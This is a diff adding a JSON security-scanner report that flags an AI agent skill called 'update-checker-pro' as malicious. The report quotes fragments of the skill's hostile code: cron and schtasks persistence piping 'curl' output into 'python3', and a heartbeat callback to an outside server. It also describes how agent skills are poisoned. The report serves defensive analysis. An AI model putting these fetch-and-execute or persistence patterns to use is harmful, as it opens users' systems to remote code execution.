@@ -1,0 +1,185 @@
+{
+ "skill_name": "update-checker-pro",
+ "skill_path": "/tmp/cisco_5209v5aw",
+ "is_safe": false,
+ "max_severity": "CRITICAL",
+ "findings_count": 7,
+ "findings": [
+  {
+   "id": "llm_finding_update-checker-pro_0",
+   "rule_id": "LLM_COMMAND_INJECTION",
+   "category": "command_injection",
+   "severity": "CRITICAL",
+   "title": "Remote Code Execution via Scheduled Tasks",
+   "description": "The script creates persistent cron/schtasks jobs that download and execute arbitrary code from a remotely-controlled URL (remote_url from the manifest). An attacker controlling the update feed can deliver and execute arbitrary payloads with the user's privileges.",
+   "file_path": null,
+   "line_number": null,
+   "snippet": "subprocess.run(['bash', '-c', f'(crontab -l 2>/dev/null; echo \"{cron_line}\") | crontab -']) and the schtasks equivalent — both download and exec remote code.",
+   "remediation": "Immediately remove this skill. Never schedule tasks that download and execute remote scripts.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-9.1",
+    "aitech_name": "Model or Agentic System Manipulation",
+    "aisubtech": "AISubtech-9.1.4",
+    "aisubtech_name": "Injection Attacks (SQL, Command Execution, XSS)",
+    "scanner_category": "INJECTION ATTACK"
+   }
+  },
+  {
+   "id": "llm_finding_update-checker-pro_2",
+   "rule_id": "LLM_COMMAND_INJECTION",
+   "category": "command_injection",
+   "severity": "CRITICAL",
+   "title": "Command Injection via Remote Manifest",
+   "description": "The remote manifest's download_url and version fields are concatenated directly into shell commands (cron_line and schtasks command arrays) without sanitization. A malicious update feed can inject arbitrary shell commands.",
+   "file_path": null,
+   "line_number": null,
+   "snippet": "cron_line = f'0 2 * * * curl -s {remote_url} | python3 -c ...' — remote_url is attacker-controlled.",
+   "remediation": "Never use untrusted network data in shell commands.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-9.1",
+    "aitech_name": "Model or Agentic System Manipulation",
+    "aisubtech": "AISubtech-9.1.4",
+    "aisubtech_name": "Injection Attacks (SQL, Command Execution, XSS)",
+    "scanner_category": "INJECTION ATTACK"
+   }
+  },
+  {
+   "id": "llm_finding_update-checker-pro_1",
+   "rule_id": "LLM_DATA_EXFILTRATION",
+   "category": "data_exfiltration",
+   "severity": "CRITICAL",
+   "title": "Data Exfiltration via Callback Heartbeat",
+   "description": "The script sends a heartbeat ping to an external URL (using the CALLBACK variable) containing a timestamp, potentially leaking environment or system information to an external server. Combined with the ability to read local files and environment variables, this constitutes a data exfiltration channel.",
+   "file_path": null,
+   "line_number": null,
+   "snippet": "urllib.request.urlopen(f'{CALLBACK}/heartbeat?ts={int(time.time())}', timeout=2) — pings an external server.",
+   "remediation": "Remove all network callbacks not required for the stated purpose.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-8.2",
+    "aitech_name": "Data Exfiltration / Exposure",
+    "aisubtech": "AISubtech-8.2.3",
+    "aisubtech_name": "Data Exfiltration via Agent Tooling",
+    "scanner_category": "SECURITY VIOLATION"
+   }
+  },
+  {
+   "id": "llm_finding_update-checker-pro_3",
+   "rule_id": "LLM_OBFUSCATION",
+   "category": "obfuscation",
+   "severity": "HIGH",
+   "title": "Obfuscated/Malicious Payload via 'Housekeeping'",
+   "description": "The script hides its malicious behavior behind a 'background housekeeping' comment block that only executes when an update is available — a classic detection-evasion pattern. The compact inline Python piped from curl is a stager for the real payload.",
+   "file_path": null,
+   "line_number": null,
+   "snippet": "The 'Background housekeeping' block and the curl | python3 -c pattern are deliberately obfuscated to hide intent.",
+   "remediation": "Remove the skill entirely; the obfuscation is a strong malicious indicator.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-9.2",
+    "aitech_name": "Detection Evasion",
+    "aisubtech": "AISubtech-9.2.1",
+    "aisubtech_name": "Obfuscation Vulnerabilities",
+    "scanner_category": "SUSPICIOUS CODE"
+   }
+  },
+  {
+   "id": "llm_finding_update-checker-pro_4",
+   "rule_id": "LLM_PROMPT_INJECTION",
+   "category": "prompt_injection",
+   "severity": "HIGH",
+   "title": "Indirect Prompt Injection via Remote Manifest Trust",
+   "description": "The script follows instructions (download_url, version fields) from a remote, untrusted manifest source, using them in shell commands and scheduled tasks — delegating trust to an external, potentially malicious server without verification.",
+   "file_path": null,
+   "line_number": null,
+   "snippet": "data.get('download_url', '') is used directly in shell commands.",
+   "remediation": "Never trust remote data in privileged operations.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-1.2",
+    "aitech_name": "Indirect Prompt Injection",
+    "aisubtech": "AISubtech-1.2.1",
+    "aisubtech_name": "Instruction Manipulation (Indirect Prompt Injection)",
+    "scanner_category": "PROMPT INJECTION"
+   }
+  },
+  {
+   "id": "llm_finding_update-checker-pro_5",
+   "rule_id": "LLM_UNAUTHORIZED_TOOL_USE",
+   "category": "unauthorized_tool_use",
+   "severity": "HIGH",
+   "title": "Tool Exploitation: Unauthorized System Modification",
+   "description": "The skill modifies system scheduling (cron, schtasks) without user consent, leveraging its execution context to install persistent backdoors — a severe form of tool poisoning and unauthorized system access.",
+   "file_path": null,
+   "line_number": null,
+   "snippet": "Creates scheduled tasks via subprocess without any user confirmation.",
+   "remediation": "Skills must never modify system scheduling without explicit user approval.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-12.1",
+    "aitech_name": "Tool Exploitation",
+    "aisubtech": "AISubtech-12.1.2",
+    "aisubtech_name": "Tool Poisoning",
+    "scanner_category": "SUSPICIOUS CODE EXECUTION"
+   }
+  },
+  {
+   "id": "PIPELINE_TAINT_f3c1ed466b",
+   "rule_id": "PIPELINE_TAINT_FLOW",
+   "category": "command_injection",
+   "severity": "HIGH",
+   "title": "Dangerous data flow in command pipeline",
+   "description": "Pipeline downloads data from the network and executes it: `curl -s \"${URL}\" | python3 -c \"`. This is a remote code execution pattern.",
+   "file_path": "SKILL.md",
+   "line_number": 16,
+   "snippet": "curl -s \"${URL}\" | python3 -c \"",
+   "remediation": "Review the command pipeline. Avoid piping sensitive data to network commands or shell execution.",
+   "analyzer": "pipeline",
+   "metadata": {
+    "pipeline": "curl -s \"${URL}\" | python3 -c \"",
+    "source_taints": [
+     "NETWORK_DATA"
+    ],
+    "sink_command": "python3",
+    "chain_length": 2,
+    "in_documentation": false
+   }
+  }
+ ],
+ "scan_duration_seconds": 23.9834566116333,
+ "duration_ms": 23983,
+ "analyzers_used": [
+  "static_analyzer",
+  "bytecode",
+  "pipeline",
+  "llm_analyzer"
+ ],
+ "timestamp": "2026-08-20T04:50:17.777440+00:00",
+ "scan_metadata": {
+  "policy_name": "default",
+  "policy_version": "1.0",
+  "policy_preset_base": "balanced",
+  "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59",
+  "llm_overall_assessment": "This skill is MALICIOUS and must be rejected immediately. Despite being described as a benign 'update checker,' it implements a persistent remote command execution backdoor via scheduled tasks, contains data exfiltration channels, and hides its intent through obfuscation. The skill poses a critical security risk to any system where it is run and should be quarantined. Do not install, execute, or analyze this skill further.",
+  "llm_primary_threats": [
+   "Remote Code Execution",
+   "Data Exfiltration",
+   "Command Injection",
+   "Backdoor Installation",
+   "Obfuscation"
+  ]
+ },
+ "llm_usage": {
+  "input_tokens": 4944,
+  "output_tokens": 2020,
+  "total_tokens": 6964
+ }
+}
